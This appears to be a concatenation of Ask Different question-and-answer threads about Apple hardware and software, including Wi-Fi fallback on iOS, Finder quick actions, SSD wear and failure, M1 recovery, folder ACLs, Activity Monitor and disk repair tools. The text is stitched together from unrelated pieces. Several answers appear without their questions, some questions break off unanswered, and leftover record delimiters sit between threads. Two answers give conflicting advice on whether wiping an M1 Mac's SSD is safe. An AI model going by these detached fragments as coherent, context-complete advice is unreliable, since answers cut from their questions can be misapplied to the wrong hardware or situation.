I'm trying to get my head around how iOS deals with a known Wi-Fi network that suddenly loses connectivity to the internet. If I'm connected to a network that's functioning normally and the network suddenly loses access to the internet (but the network SSID is still being broadcast), iOS appears to fall back to a cellular connection (if available); the Wi-Fi bars completely disappear from the status bar. When the Wi-Fi network regains internet access, however, the Wi-Fi icon then re-appears in the iOS status bar.\nIn this case, does iOS in fact stay connected to the Wi-Fi network in question but recognises the fact that no internet connectivity exists so falls back to the cellular network and periodically checks for internet access from the Wi-Fi network, or does this work in a different way entirely?\n\nA: Yes, in this case iOS does stay connected to the WiFi network and periodically checks for internet connectivity.\n\nA: Yes, iOS stays connected to the Wi-Fi network and the cellular network, but prioritises packets to go through the cellular connection until the Wi-Fi network starts carrying packages in a reliable way. This is a capability of the underlying lower-level OS, and macOS can also do this, for instance having a computer connected both to a wired and wireless connection (the network connection precedence order is defined manually by the user). The following Apple Support link describes how Wi-Fi Assist works.\nBear in mind that Wi-Fi Assist will not switch to the cellular connection if you are not actively trying to connect to the internet through a foreground application, if you're data roaming, or with large files or audio/video streaming. In all these cases the potential for a high cellular data usage — with little gain to the user — makes the OS decide not to engage with the cellular network.\n", "Q: Mac OS X 10.14.6 Add option to Right Click Menu in Finder I'd like to add a new option to the right click menu in finder that would have the same effect as the command line\n% touch $(pwd)\ni.e. this will bring the folder to the top of the list when I have finder windows sorted on Date Modified.\n\nA: In Automator, create a new Service/Quick Action adding a Run Shell Script action, with settings for both as shown in the image below.\nSave it as, e.g.,: Touch\nIt will then be available on the Quick Actions menu as well as the Services menu.\nNote that you could also create this as an Automator application and add it to the Toolbar in Finder using drag & drop, with ⌘ down as necessary.

I was using it half an hour ago, and everything worked perfectly. I turned it off and left it for five minutes or less.

Nothing changed.\nTried resetting the PRAM. What happened is the Mac kept restarting every five seconds or so while I kept cmd+alt+P+R held down and then returned to the above problem when I let go.\nIf it helps, the internal SSD is a 960-GB Aura drive with two partitions: 760 GB with Catalina and 200 GB with Windows 10.

It’s damaged. Turns out those things have a lifetime of about 5 years and I’ve had mine for 4 (and I use it heavily).\nStrangely, recovery mode did work. Here’s what happened when I managed to boot in recovery mode:\n\n*\n\n*Running first aid on my Mac partition returned a bunch of errors and failed.\n\n*I tried reinstalling the OS, but that failed after the progress bar reached the end.\n\n*I then tried restoring from Time Machine, which failed about a third of the way through.\n\n*I tried reinstalling the OS again, but it wouldn’t let me on account of there being insufficient space (there wasn’t insufficient space); restarting and going into recovery mode again fixed this issue, but it still wouldn’t install because of the same error as before.\n\n*I then tried erasing the drive in order to remove whatever it was that was causing the OS reinstallation to fail. That failed too… but apparently it did erase some important system files, because upon restart the computer no longer recognised the Mac partition as a bootable drive (it would boot directly to Windows, and holding down alt would only show the Windows partition). Thankfully, recovery mode continued to work.\n\n*Trying to reinstall the OS failed because the Mac partition was now an “incomplete drive”. I imagine the poor partition must have been in a state similar to Dresden after it was bombed, with some things still there and other things half-deleted or completely deleted.\n\n*I tried to erase the partition again, which this time worked for whatever reason.\n\n*Now I was able to reinstall the OS followed by restoring from Time Machine.\n\nMy computer now works, but I have three colies of Macintosh HD in my Volumes folder, two of which contain only system files and one of which contains everything restored by Time Machine. I imagine the former two are leftovers from reinstalling the OS and/or erasing the partition (the recovery-mode bootable files have to live somewhere, right?).\nAt this point, I’ve purchased a new SSD to replace my current one with (waiting for it to arrive in the mail) and I’m in the process of uploading my most important stuff to iCloud.

But M1 seems to be more like iPhone, which can end up in a DFU mode and require another computer to \"revive\" it.\nWill M1 Mac boot from an external drive or from the Internet, if I wipe the entire SSD?\nI guess, if I'm lucky and successfully install macOS right after the wipe, then everything is fine. So my question is, if I erase everything on SSD and restart the computer, will it be able to boot into recovery by itself or at least into recovery on the external drive?\nBoot modes for a Mac with Apple silicon says that there's \"Fallback recoveryOS\", which relies on \"second copy of recoveryOS that is kept for resiliency\". Will it also be wiped?\n\nA: Yes, it’s safe.\nFirst, boot into recovery mode using this guide: https://eshop.macsales.com/blog/74502-boot-an-m1-mac-into-recovery-mode/\nThen clear the disk using disk utility (under the utilities menu bar item), and finally, click reinstall MacOS Big Sur.\nDisk utility in recovery mode doesn’t show the entire disk by default, so make sure to go into the view menu bar option and select show all devices.\n\nA: The best information I could find suggests that erasing entire SSD is not safe (or even not allowed by standard tools) unless you have another Mac to perform DFU restore. From https://discussions.apple.com/thread/253777530 :\n\nErasing the entire internal drive on an Apple silicon Mac won't work,\nbecause that never truly happens (unless you perform a DFU restore).\nThis is because the iBoot System Container (Apple_APFS_ISC, disk0s1)\nis system critical; your Mac literally cannot start up without it.

In Classic Mac OS, : was the path separator, not /. (Classic Mac OS itself copied the : as the path separator from SOS for the Apple III.)\nOS X is based on Unix (technically XNU, with POSIX compliance), and so the Unix parts, such as the command-line tools, used / as the directory separator. However, the GUI and the actual file-system used on disks (HFS+) had to deal with the Classic Mac OS apps, which were using : as the directory separator, just as they always had.\nThus, for backwards-compatibility, the GUI layer (i.e., the Finder) does not allow : characters to be used in file names and Unix does not allow /.

I have Safari 14.0, macOS 10.15.7\n\nA: When you open a new tab, it will not share any cookies (and thus login status) with any other tabs.\nWhen the website opens a new tab, a connection between those tabs exists that allows Javascript to execute across the tabs. This connection is preserved in Private Tabs and also means cookies are shared.\nI'm not aware of documentation for this, but it's easy to confirm. If you open GMail and right click to open a new tab, it does not stay logged in. But if you click a link Google configures to open in a new tab, it will stay logged in.\n", "Q: Path to the Bin directory I am unable to determine the path to the Bin directory, the one that is shown in Finder window when I click on The Trash icon in the Dock.\nI am seeking it, so I can either use the Finder's Go to Folder... or Terminal's open command to directly open the Bin folder in Finder.\n\nA: Each user gets their own bin on each volume that’s attached, so your assumption that path stores all files visible in the “bin” or “trash” isn’t technically true.

I have not downloaded anything in the last week, but the popup has started appearing since today only. I have no idea what this file is or where it is located.\nCan anyone suggest any methods (without downloading an anti-virus, if possible) by which I can remove this file permanently?\n\n\nA: Since the system is modified, I’m not so sure we can even trust gatekeeper now. My answer below is still good advice (especially for people with 100% authentic macOS installations) but the waters are much muddier now that more details have come to light on this specific mac. Nothing wrong with system modifications, but they change expectations based on what specifically was disabled and changed.\nWith this in mind a scan by Malware Bytes is a very correct next step: https://malwarebytes.com/mac/\n\nIf the system can’t move the file to the bin, then you probably want to do an erase install. I might not reconnect a Time Machine drive if you already have a good backup from before this happened to be safe and instead connect a new drive and let the system back up.\nYou might even try booting in safe mode and applying all security updates and then boot again in safe mode to make one new backup to a new direct attached hard drive. This may prevent the periodic script that is trying to reinstall something bad from running.\nAt that point, you can erase the mac and then move your data back. The system is designed to eliminate a threat like this and if clicking the button doesn’t clean it - you need special skills, special additional software to avoid an erase install.\n\nA: In the usual case this alert presents the name of a file or application, so you might try searching for a file with the name \"24B93E7F-8822-4465-B473-7BE7BB8E3E4A\" using a Finder search or a file system search app (I use Easy Find, freeware from Devon Technologies). Once you've found it, you can delete it.\nFiles with UUIDs as filenames are usually scratch files used by applications or the system to store data the user shouldn't be interested in. If one gets moved or corrupted it could trigger this kind of warning, I suppose. It's probably not anything explicitly dangerous, but to be on the safe side I wouldn't try opening it.\n", "Q: Full remote access and control of iPhone from Mac, other iphone or other device without icloud I'm aware that there are some screen sharing apps like TeamViewer and Zoho Assist.

Would converting to APFS damage the contents of the drive?\nI'm also open to any guidance for additional steps I can try.\nThanks in advance,\nTaylor\n\nA: There are several approaches you can take to this.\n\n*\n\n*Fix the drive using better tools than fsck. DiskWarrior has always been the go-to tool for this. It will not damage the drive further, as it makes 'virtual' fixes which you can test before committing the changes. Disk Warrior is great on HFS+ but cannot handle APFS.\n\n\n*Rescue the drive to another drive. Disk Drill is a good tool for this. It will scavenge the drive for any undamaged data then allow you to copy that off to another drive. This should also leave the original unchanged.\n\n\n*Copy the data off, as is & try to recover once you know you have a copy. Using the built-in dd command to literally copy all data, byte for byte across to another drive. Instructions at My External Hard Drive's format changed to FAT16 without any reason\nThis still requires you to perform the rescue using Disk Drill or similar, but working on a safety copy.\n\n\n*Give the drive to a data rescue professional.\n\nA: It looks like you have run across an issue with an external HFS+ disk that Disk Utility can't fix.\nYou could try running disk utility again a time or three but I would bet you get the same results. I have seen running Disk Utility repair multiple times actually fix the problem sometimes.\nYou will likely need to look into a third party disk repair utility. My go-to on that front used to be DiskWarrior. But it can't handle APFS volumes (yet, supposedly). That is not an issue for this specific use case as it could repair that volume.\nIf you want a utility that might fix that volume and fix future problems with APFS TechTool Pro (I believe) supports APFS and may be able to repair the volume.\nNote that no disk utility is guaranteed to be able to fix any disk issue like yours, but they generally do a better job than Apple's Disk Utility.app and will usually be able to fix the issue.\n", "Q: Understanding the activity monitor of mac I am trying to understand each field of activity monitor to understand my process usage.\nBut I am not able to wrap my heads around few things.\n  Model Name:   MacBook Pro\n  Model Identifier: MacBookPro11,4\n  Processor Name:   Intel Core i7\n  Processor Speed:  2.2 GHz\n  Number of Processors: 1\n  Total Number of Cores:    4\n  L2 Cache (per Core):  256 KB\n  L3 Cache: 6 MB\n  Hyper-Threading Technology:   Enabled\n  Memory:   16 GB\n\nNumber of cores here are 4 but if I see the See CPU Usage in activity monitor, I see 8 blocks, how they are corresponding to 4 cores.\n\nIn memory what are Swap Used, does Memory used and Cached Files are always have to be less than or equal to Physical Memory.\n\n How to know if the maximum read and write IO operations are being performed looking at the graph.\n\nThere is also a Data option which I don't understand how it is different from IO operation.\n\nA: I have taken your questions as relating to four areas which I will attempt to answer in the same sequence. I am writing this because I feel that @Ezikiel Elin answer is, in some parts, misleading.\nPhysical cores and hyper-threading\nYour CPU has 4 cores, but also has Hyper-threading which presents 8 virtual cores to the operating system.  This has the benefit of allowing the cores to more rapidly change from running one process thread to another thread (quite likely from a different process).  There are circumstances where this can slow throughput, but it is usually beneficial.\nActivity monitor presents all 8 virtual cores. The first physical core is shown as the first two virtual cores in the graphs. The second physical is in graphs 3 and 4, and so on.  In your example, the cores are only lightly loaded and not sufficient to make significant use of hyper-threading.\nSwap and Compressed\nThere are time when macOS and your running applications need more memory can than comfortably fit in physical RAM.  In that case, the memory management of macOS frees up RAM in two ways:\n\n*\n\n*Take some memory and compress it.  In your example, 906 MB of physical RAM is being used to store some unspecified (but probably about twice that) of macOS and application memory. Of course, the memory will need to be decompressed before it is next used.\n\n\n*Move some portions of memory out of physical RAM and store them on the boot disk.  In your case, 6.64 GB of disk space in being used in this way.  When an application requires to use that memory, it will have to be brought back into physical RAM.  This moving portions of memory out and in to RAM is called swapping and the disk space used is in one or more swap files.\nCompressing and decompressing is a relatively fast action using a highly efficient algorithm. Swapping is slower. When boot disks were hard disks, this was a key cause of slow system response. With SSDs, this is quicker and leads to a more responsive feel to the system.\nmacOS's memory tuning has a preference for compression rather than swapping, though in your example, it has decided that rather a lot of memory must be taken out of physical RAM and placed in the swap files. Ideally, the memory tuning will have chosen application memory that is unlikely to be wanted for some time.\nMemory calculations\nMemory allocations can be counted in more than one way, but as presented by Activity Monitor:\nApp Memory + Wired memory + Compressed = Memory Used\nWired memory is memory which can't be compressed or swapped. I don't like the use of \"memory used\" in this context because, in reality, nearly all the physical RAM is usefully occupied.  But that is what Activity Monitor calls it.\nMemory Used + Cached Files + Free memory = Physical Memory\nSo it is true that Memory Used + Cached Files is always less than or equal to Physical RAM.\nWith a simple calculation, you can work out that your Free Memory is only 0.10 GB.\nYour \"memory pressure\" graph is green, which indicates that macOS is able to manage memory with few bottlenecks.\nDisk IO and Data\nTo the left of the graph, Activity Monitor shows that number of read and write operations (called IO in the graphs) both as totals since boot and current rates.\nEach disk operation can read or write variable amounts of data. The values for amount of data and current rates are on the right hand side. The graph calls this DATA (which seems reasonable to me).\nFrom your graphs and current counters, the Mac looks fairly busy from the disk point of view. But the graphs have no units which does limit their usefulness.\n\nA: *\n\n*You see eight cores because your Mac has an Intel chip that creates virtual cores. Your hardware only has four.\n\n*Swap used refers to the amount of memory that has been \"swapped\" to the disk for temporary archival. This happens when your system runs low on memory, but unless your \"memory pressure\" is consistently high this isn't indicative of a problem.\n\n*Because of Swap, there is no requirement that the amount of memory used is less than Physical memory.\n\n*I'm not sure there's an answer here. This graph doesn't have units, it isn't intended to be used except to estimate changes in usage. I would recommend looking at \"Data read/sec\" and \"Data written/sec\" and comparing these figures to your SSDs rated performance (you can google what your computer should be getting). In general though you will not get that figure because unless you're writing/reading one large file there's a lot of additional processing and overhead.\n\n*I/O refers to your disk read/writes, and Data refers to the amount of data being read/written.\n\nThe other answer from @Gilby has more detail - please refer to that as well!\n", "Q: Stop media from pausing when bluetooth speaker disconnects How can I stop YouTube from pausing itself when I turn off the Bluetooth speaker to which my MacBook is connected?\n\nA: According to these two following posts:\n\n*\n\n*Launch AppleScript when bluetooth device is disconnected\n\n*Mac : Launch command when device connected by bluetooth\nIt seems possible to create an AppleScript that acts on bluetooth disconnect and resumes your music but I have not seen a way to avoid the \"pause\" command issued on disconnect.\n", "Q: How do I sync app installs across devices?

(On M1 Mac) Lithium Ion Batteries last longest when operating between 80% and 25% charge. I understand MacOS Big Sur has a battery optimization tool built in which is designed to handle this, however I feel that I would rather manually control it. I'd only want it to charge to 100% when I'm traveling; the rest of the time 80% is more than enough capacity for their amazing new M1 processor.\nThere is another question here:\nCan I tell my Mac to charge to 80% only?\nBut it seems like most of the answers work only for Intel-based Macs, so I though I'd create a duplicate. I'm not sure how the mods feel about this, but I felt the different architecture warranted a new question.\n\nA: You can enable some manual control by installing AlDente:\nhttps://github.com/davidwernhart/AlDente\nIt will allow you to set the limit to 80% (and you could then change that limit when you travel). However, it is not perfect at limiting it at precisely 80%, but is probably as good as is possible with a software-only solutions.\nNote that this type of manual control comes with a number of drawbacks (you can read more about that in AlDente's documentation).

Any recommendations to help extend the life of my M1 Macook Air internal SSD? I recently killed my old (2012) MacBook Pro's hard drive by doing something I didn't realize was a problem. I've now purchased a nice little M1 MacBook Air to replace the old workhorse MBP, and it's only got a tiny 256GB SSD in it. I've already done the same workflow described below a few times in the last few weeks and, being paranoid, am wondering how to ensure this laptop lasts more than 2 years. I've been reading that SSDs wear out faster with frequent writes/rewrites.\nHere's my workflow:\nI attend a lot of training webinars and Zoom video calls with clients: 5 to 10 webinars and 5 to 10 calls every week, most being in the 1 to 2 hour range. I record them using Camtasia (it just happens to be the software I've got installed) and export to MP4, but it creates huge files, so I then use Handbrake to compress them down to either 570p or 480p depending on the content, saved in a different directory, same name as the original Camtasia MP4 output. Once I have the final output, I back that up on to an external hard drive (a few years old Western Digital HDD) - it's an 8TB drive, with just under 7TB of space remaining: I only use that to read back from, it's not used as a read/write device.\nApparently, doing this over and over again (a lot of online webinars/calls, remember) for 2+ years was sufficient to kill the old MacBook's internal hard drive, the original HDD. The steps: write and erase the Camtasia .trec file, write and erase the original Camtasia 1080p file, write the Handbrake file in one directory, overwrite the original Camtasia 1080p file. Every time the MBP's internal drive got close to full, I'd move stuff to the external backup and erase the files on the internal drive.\nWhat would be your recommended solution? Should I not write anything on that internal SSD, other than plain old text/PDF documents? Should I use an external drive from the very first step of recording the training videos? Record the video on the internal drive and then export the MP4 to an external drive? SSD or HDD external drive?\nAm I overthinking this? Because it's just a 256GB SSD (yeah, dumb choice, but I was watching pennies that day), I've already recorded 100GB plus a couple of times over 3-4 days (Camtasia 2021 outputs ginormous files), and I've already erased my .trec files a few times.\nAny help/insights would be appreciated.\n\nA: Am I overthinking this?\nYes.\nMechanical 'spinning rust' hard drives have a typical lifespan of less than 5 years. Excessive work could shorten that.\n(You could replace the hard drive in your 2012 MBP with an SSD (get a SATA 2.5\" type), and you would notice a considerable improvement in the speed of the Mac.)\nThe myth of needing to guard precious writes on SSDs stems largely from old technology when SSDs first became 'mainstream' c. 10 years ago. Most SSDs now have lifespans that exceed the useful life of the device they are inside.\nEstimates for the lifespan of Apple's M1 SSDs (256 GB) are at least 300 TB of writes (though could be significantly higher), so if my maths is correct, you've got over 8 years of 100GB per day.\nOne caveat is that it's not clear whether M1 Macs can function if the on-chip storage fails.\nAlso, re your 'backup drive': remember that a backup is a second copy. You should always be prepared for any storage device to suddenly stop working, by having another device with the same files on it.\n", "Q: Accessing files from Docker container in Finder I'm exploring using Docker for web development on my MacBook.

I have a 2020 MacBook Air (M1) I've used for a while, which is why I want to do a clean install of macOS Monterey once it becomes available. I know on intel macs pressing ⌥⌘R will re-install the latest OS available, but I don't see an option for it in M1. (It is the original recovery page). Is there a way I can clean install macOS and wipe it at once? (preferably not using a bootable USB) Or will I need to upgrade first and then wipe?\n\nA: How to upgrade?\nApple's OS installers are designed to install in the place of an existing OS installation. The OS system files are on a separate, read-only partition that is cryptographically 'sealed'. Only Apple's installers can change the files there.\nSo there is absolutely no benefit for the OS; no 'cleaning' that gets done by wiping the OS before re-installing the OS. If you then restore all your software and user preferences from Time Machine, then you have removed any possible benefit.\nSecondly, you've only had the thing for a few months! What is it that you are hoping to 'clean'? Cache files? Third-party apps? User settings? These can all be deleted individually  without deleting everything.\n'Nuke and pave' is time-consuming; teaches you nothing about how to maintain your computer; and unnecessary.\n(By contrast, I haven't done a clean install in c. 15 years, and have cloned my system disk to each new Mac without any performance problems or other issues.)\n", "Q: Dual boot mac with ubuntu boots from refind into grub instead of ubuntu Here is what I have done so far:\nI wanted to dual-boot my mac with ubuntu. I did this following the classic guides, except instead of clicking on the installer I opened it with the command \"ubiquity -b\" in the terminal (since I was getting a grub error).\nThe download worked this way and I also successfully installed rEFInd.\nHere is my problem (see pictures below):\nWhen I start my mac the refind screen pops up with my ubuntu and mac OS. Yet when I choose Ubuntu I get to a grub screen.\nHow to I get to the normal Ubuntu screen? I ran some ls commands so you can see what I am working with (feel free to ask for more pictures with other commands).\nAlso: is the error I get im picture 2 a sign of a problem?\n\n\n\n\nA: When a grubless Ubuntu is installed, the rEFInd boot manager can be used to instruct the firmware to boot Ubuntu. However for this to happen, a Linux filesystem driver has to loaded first. In your case, the rEFInd boot manager will load the driver, if the ext4_x64.efi file exists in the efi/refind/drivers_x64 folder on the same volume rEFInd is installed. You should be able to find the ext4_x64.efi file on the same media as downloaded with rEFInd.\nFrom macOS , you should be able to mount the EFI volume where rEFInd is installed by using the command given below.\nsudo diskutil mount disk0s1\n\nYou can unmount by using the command given below.\ndiskutil unmount disk0s1\n\nYou may also have other reasons for your problems.

It works fine.\nI am aware of sleep/hibernate issues with NVMe drives, but as per this Macrumors thread (search for 6 - Hibernation issues on 2013-2014 laptops​ to arrive at the relevant section), Big Sur with Boot ROM 427.0.0.0 and higher prevent deep sleep issues without further system modifications.\nBut when I go to About This Mac > System Report > Hardware, the line for Boot ROM Version is missing there. It definitely was listed under High Sierra (I have a screenshot of it before the swap).\nCurrently, it shows me the following (relevant lines shown):\nModel Identifier: Macbook Pro11,2\nSystem Firmware Version: MBP112.0146.B00\nSMC Version: 2.18f15\n\nI even tried running /usr/libexec/firmwarecheckers/eficheck/eficheck --integrity-check and the output was:\nEFI Version: MBP112.88Z.0146.B00.1804111138\nPrimary allowlist version match not found for version MBP112.88Z.0146.B00.1804111138\n\nHow can I figure out what is my current Boot ROM version. Any pointers?\nP.S - I am aware of the workaround to completely disable deep sleep and hibernate, but I think with the right Boot ROM version i.e. 427.0.0.0 or higher, I wouldn't need to do anything at all.\n\nA: As it turns out, Boot ROM Version has been renamed to System Firmware Version.\nMy mid-2015 MBP's BIOS version is indeed higher than v427, but late-2013 model uses another versioning convention. MBP112.0146.B00 doesn't seem to be causing any sleep or hibernate issues from what I have seen today itself.\n", "Q: Cannot reinstall macOS from Recovery partition I have an iMac - Oct 2015, 27” 5K display, External OWC SSD, OS 11.5.1\nAbout 6 months ago, the iMac’s internal HD, a 1 TB Fusion HDD - for lack of a more precise description - started acting “flaky” and I decided it was time to stop relying on it. I purchased an external OWC 500 GB SSD and all has been well since.\nFor the record, I also have an OWC Dual Dock Drive with two HDDs devoted to alternative TM backups.\nI decided I might as well get some use out of that internal Fusion HDD so I shut down, detached the OWC SSD, booted up in Internet Recovery Mode and did my best to erase the Fusion HDD before reinstalling the macOS.  This may have been a mistake.\nDisk Utility Screenshots of that Fusion HDD.\n\n\n\nThat done, still in Recovery Mode, I went back to macOS utilities and chose Reinstall macOS.\nmacOS Sierra was what was offered - the macOS my iMac came with.\nI clicked on Continue, saw the drop-down noting Loading installation information, then Agree.\nAnd here is where things stalled out. I got the macOS Sierra window and Select the disk you want to install macOS.\nI waited and waited and waited but no disk was forthcoming and so I could not choose Continue to move forward.\nIf any one is having a quiet weekend and can offer any suggestions/see anything I have done wrong, I’d greatly appreciate your input.\n\nA: I stumbled around until I finally figured it out via hit and miss.\nI restarted in Recovery Mode, erased Fusion HD, and still in Recovery Mode, tried to reinstall the macOS and failed.\nTried to reinstall from a Time Machine backup and failed.\nI recalled having an old DW Recovery stick.  Used that, and was able to install Sierra.  Rebooted in Sierra and updated to Big Sur.

New to the MacBook and Big Sur. Did multiple searches, no results specific to my question. Is it normal for the \"Documents\" folder to only show under \"Sharing & Permissions\" the \"You have custom access\"?\nI know I change permissions, but the \"Documents\" folder doesn't allow that. Guidance? Explanation please?\nOddly enough, when I view the Documents from the second Admin account on the Mac, I don't see the \"You have Custom Access\", and I'm allowed to adjust the Documents folder permissions and access.\nThanks in advance.\n\nA: Multiple folders in the home folder ~/ have what Finder reports as \"You have custom access\".\nFinder's Get Info only reports simple Unix style permissions based on read/write for Owner, Group (by default Staff) and World (Everyone).\nBut modern file/folder permissions can also use Access Control Lists (ACL). These first appeared on Windows with Windows NT and on OS X from 10.4.  But their history goes back further - certainly to VAX/VMS and RSX-11M, and Wikipedia says Multics.  An ACL consists of one or more Access Control Entries (ACE).\nmacOS adds an ACL to some folders in `~/'. Apple does not provide a GUI interface for viewing or modifying ACLs.\nTo see the full permissions including the ACL, open Terminal and use ls commands like these two:\nls -led ~/\ndrwxr-x---+ 86 gilby  staff  2752  7 Aug 11:17 /Users/gilby/\n 0: group:everyone deny delete\n\nls -led ~/Documents\ndrwx------@ 43 gilby  staff  1376 18 Jul 13:34 Documents\n 0: group:everyone deny delete\n 1: group:com.apple.sharepoint.group.16 allow search\n\nThe rwxr-x--- and  rwx------ are Unix style permissions for owner, group and world.\nThe subsequent lines are ACEs.\nFor both the examples the ACL it is saying that no-one (not even the user) can delete the directory.\nThe second ACE for ~/Documents is related to file sharing - it may not be present on your Documents folder.\nI recommend you do not try to modify these or any other ACLs created by macOS. If you are determined to do so the chmod command can be used.  Read man chmod for how to do this - the example commands are useful.\nMore safely, you can use chmod to modify the Unix style permissions - read the man page for usage and examples.\nAs an alternative to the command line, you can use TinkerTool System (not free) to view and modify both ACLs and Unix/POSIX permissions.\nApple's reference for file and folder permissions is File system Details which discusses both Unix (also referred to as POSIX) permissions and ACLs.\nSee also this question and answer What are all the available ACL attributes in Mac OS 10.13 High Sierra?.\n\nA: The folder itself has custom permissions because you don't have permission to change it, rename it or delete it.\nThe contents, you have full control over.\nAfter the question edit & comments.\nAs an admin you can change any aspect of the permission on your own or anyone else's Documents folder [or any other]. The only thing stopping you is the little lock icon on the Get Info window, which you of course have the password to.\nIt doesn't mean you should, only that you can if you actually need to.\nI just realised this is actually different on Big Sur. I'm assuming your own folder is protected by SIP, whereas someone else's isn't. It seems whoever redesigned the perms for Big Sur forgot that;)\n", "Q: How to retrieve a shopping list out of Face-Id? So I write down what I'm going to buy before going to buy grocery.\nWhether I am masked or need to enter my PIN, it's a pain to retrieve the list several times during a shopping trip. I usually use Notes for this list since it enables syncing from macOS.\nI can of course disable an iPhone's PIN and Face-Id before entering the store and reenable afterwards, but this is far from a good solution.\nHow else might I prepare my iPhone to be able to pick it up, press the power button, and see a grocery list (while masked and without entering my PIN)?\n\nA: If you are fortunate enough to own an Apple Watch, you can simply use the Reminders app, and the same list will appear on the Reminders app on the watch, where you can also check off items as you put them in your cart. No FaceID or TouchID required.\nThe Apple Watch also can be configured to help unlock FaceID with a mask on as well. If you have a trusted Apple watch, FaceID will accept a partial Face scan with a trusted apple watch.\n\nA: You can use Reminders to do that :\n\n*\n\n*Write your shopping list in a Reminder (in notes) and give it a title\n\n*Set a notification a few minutes before going in the shop\n\n*You should see your shopping list on your lockscreen by long-pressing on it\n\nOtherwise, you can screenshot the note and set it as the lockscreen wallpaper.\n\nA: iOS 15.4, which is currently in beta (https://beta.apple.com/sp/betaprogram/), supports a feature that allows unlocking while wearing a mask.\n15.4 should become available to the general public in the coming months and will resolve this problem.\n", "Q: What is new about the \"new\" Magic Mouse as of August 2021?

I saw a post\nMac Mini 2018 - 3 monitors\nbut I can't really follow it, but I do understand that I should use the 2 thunderbolt ports and the HDMI port. I would like to have 24 inch monitors and not spend a lot. Can anyone suggest what I should look for and what I should avoid?\n\nA: The 2018 Mini was released in October of that year, so I'm afraid you've got the 2014 model.\nWith a mechanical hard drive, 7-year old CPU, and under-powered graphics, you are likely to find the experience somewhat underwhelming, which may unfairly put you off returning to Mac.\nThere can be very long gaps between hardware revisions -- Apple continued to sell the 2012 MacBook Pro until late 2016. So it's always better to check exactly what 'vintage' it is, and keep an eye out on the Apple news websites about the likely date of new releases.\nYour Mini can handle 2 external displays, either 1 HDMI and 1 via Thunderbolt, or both via Thunderbolt. Each display can be up to 2560 x 1600.\nhttps://everymac.com/systems/apple/mac_mini/specs/mac-mini-core-i5-2.6-late-2014-specs.html\nYou need to consider not just the physical size of the monitor, but how many pixels it has, and thus the pixel density. Hi-density monitors work well on macOS; low-density monitors can look a bit blurry. If you can find a 24 or 27\" 2560 x 1600 display, that would be good. Then have a smaller secondary display, both physically and in pixels.\nTo maximize your existing investment, you might consider replacing the internal hard drive with an SSD - though the ifixit tear-down guide shows it as 'Moderately difficult'. Alternatively, you could run the OS off a fast new external SSD drive. Replacing the RAM with 16GB should be cheap and is much easier.\nThe 2014 model was a cheap entry model, and will still be good for a few years of light work - email, web, Word/Pages, etc. But don't expect to render 4K video or model 3D protein structures. ;-)\n", "Q: Can the hard drive on MacBook Pro (Retina, 13-inch, Mid 2014) be replaced to bigger size I currently have a MacBook Pro (Retina, 13-inch, Mid 2014, 2.6 GHz Intel Core i5, 8 GB 1600 MHz DDR3).\nThe current internal drive is 128 GB SSD, but I need a bigger internal drive. I have contacted a few computer shops and half have said yes we can do it and half have said no. One said it can not be done and the others are telling you wrong.\nQuestion is can the internal drive be replaced?\n\nA: Yes, its possible. There is an entire guide for it as well. It's simply a matter of opening the laptop back panel, and swap the SSD. You would need the right screwdrivers for it though.\nAlso note that you don't necessarily need the expensive apple ones. It is possible to use a regular NVMe SSD that's quite cheaper with an adapter. Have a read  at first post of this thread.\nYou might or might not have to tinker with deep sleep or hibernate settings if you face any issues when the laptop goes to sleep and unable to wake up. But I just swapped my SSD on a Late-2013 model and I didn't have to. Big Sur updates come with firmware that seems to have fixed those issue.\n\nA: Without knowing the Model ID, can't say for sure, however, looking at OWC Solid State Drives it says it can be replaced.\n\nWorks with the following Model IDs\nMacBookPro11,1     MacBookPro11,2    MacBookPro11,3     MacBookPro11,4    \nMacBookPro11,5     MacBookPro12,1\n\n", "Q: Update Apple ID Settings - Unable to set-up keychain Can anyone suggest a fix to this please, I recently reinstalled macOS Big Sur on my Mac Pro and verified my iTunes account using my iPhone, I have all the check boxes ticked except 'keychain'.

I'd like to have a Safari window that routes all its traffic through a custom proxy for debugging, while the rest of the traffic on my machine uses the normal system-level proxy settings. Is this possible?\n\nA: Safari only supports using the system-wide proxies configured in System Preferences. There may be a Safari extension out there that supports this feature, but I haven't heard of one.\nIf you don't have to absolutely have to use Safari, Firefox allows for configuring a proxy independent of the system-wide one.\n", "Q: Searching Sheets in Numbers to Total an Amount Im building a cookbook for a restaurant that I work at in Numbers and need to total the amount of supplies I need for an ordering guide.\nThe ordering guide is as follows:\n\nI want the green cell to be the total amount of that ingredient. Each sheet in the book is a different recipe, like this:\n\nI just want the par guide to grab the \"Scaled Amount\" for each ingredient and add them together, so I know how much to buy. Im hoping for it to do this automatically, so Im not manually looking for each cell to add to a total, instead using something like VLOOKUP to combine totals.\n\nA: You can add up values found by two or more VLOOKUPs in the same formula assuming they are all numbers and there are no errors. However, for search functions such as VLOOKUP to work as intended, you need to have the same names to be used in both search formulas and the sheets being searched through except the capitalizations.\nThis implies a significant problem in your existing setup which is the respective names for most ingredients in the recipe sheets not being the same as those in the ordering guide sheet. For example, Maldon salt is called “Salt, Maldon” in the ordering guide sheet but “Maldon Salt” in the Pizza Dough recipe sheet. While both of these names might appear as nearly the same to a human, they are quite different to Numbers.\nTo fix this, for example, you should use the same name for Maldon salt everywhere including the ordering guide sheet. If you need to have a different name in the ordering guide sheet than in the recipe sheets, then you may add a (hidden) column before the “Description” columns in the ordering guide sheet, have the cells in these columns carry the same ingredient names as in the recipe sheets and use those to search for Maldon salt in the recipe sheets.\nThe other potential problem for you could be a too high number of recipes which could lead to too long search formulas. You need as many VLOOKUPs as the number of recipe sheets in each “Amount to Order” cell formula in the ordering guide sheet to get the correct total for an ingredient. I think a formula with ten to fifteen VLOOKUPs might be manageable and stay within the formula length limit Numbers impose (not sure what the limit in Numbers is but I reckon it is not as high as the 16k characters limit for a formula in Excel).\nNote that you could avoid manually creating a different search formula for each ingredient in the ordering guide sheet if you use the absolute referencing wisely. After creating a proper formula for only one of the ingredients, you can copy & paste it to all other “Amount to Order” cells in the ordering guide sheet to get the total for each ingredient.\nIf you actually run into the problem of too-long formulas in the ordering guide sheet, you may consider having more than one recipe in one sheet and using the SUMIF or the SUMIFS functions instead of VLOOKUP.\nGood luck!\n", "Q: attempt to right click on a hyperlink in safari causes safari to freeze I have my macbook pro 2013 model with macOS updated to Catalina, everytime I try to right click on a hyperlink in the safari browser , safari freezes then I had to force quit.\n\nmy safari browser also freezes when I try to open file dialog box.

